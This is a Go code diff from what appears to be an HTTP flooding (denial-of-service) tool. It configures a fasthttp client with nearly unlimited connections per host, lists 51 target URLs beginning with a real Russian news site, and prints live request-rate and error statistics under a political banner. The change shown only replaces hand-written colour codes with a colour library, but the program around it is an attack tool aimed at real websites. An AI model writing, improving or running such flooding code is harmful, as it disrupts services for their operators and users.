@@ -6,20 +6,13 @@ import (
 	"sync/atomic"
 	"time"
 
+	"github.com/gookit/color"
 	"github.com/valyala/fasthttp"
 )
 
 var client = fasthttp.Client{MaxConnsPerHost: 999999}
 var count uint64
 var errors uint64
-
-var (
-	red    = "\033[1;31m"
-	green  = "\033[1;32m"
-	yellow = "\033[1;33m"
-	teal   = "\033[1;36m"
-	reset  = "\033[0m"
-)
 
 var urls = [51]string{
 	"https://lenta.ru/",
@@ -99,15 +92,19 @@ func main() {
 		timeElapsed := float64(time.Since(startTime).Round(1*time.Second)) / 1000000000
 
 		fmt.Print("\033[H\033[2J")
-		fmt.Println(teal + "Slava " + yellow + "Ukraini!" + reset + "\n")
-		fmt.Printf("Requests/s: "+yellow+"%d"+reset+"\n", uint64(float64(count)/timeElapsed))
-		fmt.Printf("Total requests: "+yellow+"%d"+reset+"\n", count)
-		fmt.Printf("Successfull requests: "+green+"%d"+reset+"\n", count-errors)
-		fmt.Printf("Successfull requests/s: "+green+"%d"+reset+"\n", uint64(float64(count-errors)/timeElapsed))
-		fmt.Printf("Errors: "+red+"%d"+reset+"\n", errors)
-		fmt.Print("Time elapsed: " + teal)
-		fmt.Print(time.Since(startTime).Round(1 * time.Second))
-		fmt.Print(reset + "\n")
+		fmt.Println(color.Cyan.Render("Slava ") + color.Yellow.Render("Ukraini!") + "\n")
+		fmt.Print("Requests/s: ")
+		color.Yellow.Printf("%d\n", uint64(float64(count)/timeElapsed))
+		fmt.Print("Total requests: ")
+		color.Yellow.Printf("%d\n", count)
+		fmt.Print("Successfull requests: ")
+		color.Green.Printf("%d\n", count-errors)
+		fmt.Print("Successfull requests/s: ")
+		color.Green.Printf("%d\n", uint64(float64(count-errors)/timeElapsed))
+		fmt.Print("Errors: ")
+		color.Red.Printf("%d\n", errors)
+		fmt.Print("Time elapsed: ")
+		fmt.Println(color.Cyan.Render(time.Since(startTime).Round(1 * time.Second)))
 	}
 }
 
